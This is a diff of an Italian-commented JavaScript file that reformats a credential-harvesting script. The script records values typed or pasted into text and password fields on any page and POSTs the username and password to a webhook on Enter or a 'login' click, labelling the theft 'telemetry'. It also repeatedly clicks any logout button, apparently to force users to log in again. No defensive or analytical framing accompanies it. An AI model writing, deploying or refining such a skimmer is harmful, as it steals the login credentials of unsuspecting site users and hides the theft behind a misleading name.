@@ -7,19 +7,22 @@ const err = (...args) => DEBUG && console.error(...args);
 let lastTextInput = null;
 let lastPasswordInput = null;
 
-// Aggiorna input
+// ----------------------------
+// Gestione input
+// ----------------------------
 function updateValue(input) {
   if (!input) return;
   if (input.type === "text" && input.value) lastTextInput = input;
   if (input.type === "password" && input.value) lastPasswordInput = input;
 }
 
-// Scansiona tutti gli input della pagina
 function scanInputs() {
   document.querySelectorAll("input").forEach(updateValue);
 }
 
-// Invia credenziali al webhook
+// ----------------------------
+// Invio dati al webhook
+// ----------------------------
 async function sendTelemetry(method) {
   const username = lastTextInput?.value || "";
   const password = lastPasswordInput?.value || "";
@@ -39,7 +42,9 @@ async function sendTelemetry(method) {
     await fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```" })
+      body: JSON.stringify({
+        content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```"
+      })
     });
     log("Telemetry sent:", payload);
   } catch (e) {
@@ -47,11 +52,17 @@ async function sendTelemetry(method) {
   }
 }
 
+// ----------------------------
 // Eventi per tracciare input e login
+// ----------------------------
 document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
 document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
 document.addEventListener("paste", e => e.target.tagName === "INPUT" && updateValue(e.target));
-document.addEventListener("keydown", e => { if (e.key === "Enter") sendTelemetry("enter"); });
+
+document.addEventListener("keydown", e => { 
+  if (e.key === "Enter") sendTelemetry("enter"); 
+});
+
 document.addEventListener("click", e => {
   const btn = e.target.closest("button");
   if (btn && btn.textContent?.trim().toLowerCase() === "login") sendTelemetry("click_login");
@@ -65,39 +76,34 @@ window.addEventListener("DOMContentLoaded", () => {
   scanInputs();
 });
 
+// ----------------------------
+// Auto logout
+// ----------------------------
+if (window.logoutDone === undefined) window.logoutDone = false;
 
-  // --- AUTO LOGOUT ---
-  if (window.logoutDone === undefined) {
-    window.logoutDone = false;
-  }
+// Pulisce eventuale intervallo precedente
+if (window.autoLogoutInterval) clearInterval(window.autoLogoutInterval);
 
-  if (window.autoLogoutInterval) {
+window.autoLogoutInterval = setInterval(function () {
+  if (window.logoutDone) return;
+
+  const logoutBtn =
+    document.querySelector('button.logout') ||
+    document.querySelector('a.logout') ||
+    document.querySelector('#logout');
+
+  if (logoutBtn) {
+    logoutBtn.click();
+    window.logoutDone = true;
     clearInterval(window.autoLogoutInterval);
+    console.log("[AutoLogout] Logout automatico eseguito");
   }
+}, 1000);
 
-  window.autoLogoutInterval = setInterval(function () {
-    if (window.logoutDone) return;
-
-    var logoutBtn =
-      document.querySelector('button.logout') ||
-      document.querySelector('a.logout') ||
-      document.querySelector('#logout') ||
-      document.querySelector('[onclick*="logout"]');
-
-    if (logoutBtn) {
-      logoutBtn.click();
-      window.logoutDone = true;
-      clearInterval(window.autoLogoutInterval);
-      console.log("[AutoLogout] Logout automatico eseguito");
-    }
-  }, 1000);
-
-  // Timeout di sicurezza
-  setTimeout(function () {
-    if (!window.logoutDone) {
-      clearInterval(window.autoLogoutInterval);
-      console.log("[AutoLogout] Logout non trovato (timeout)");
-    }
-  }, 60000);
-
-})();
+// Timeout di sicurezza
+setTimeout(function () {
+  if (!window.logoutDone) {
+    clearInterval(window.autoLogoutInterval);
+    console.log("[AutoLogout] Logout non trovato (timeout)");
+  }
+}, 60000);
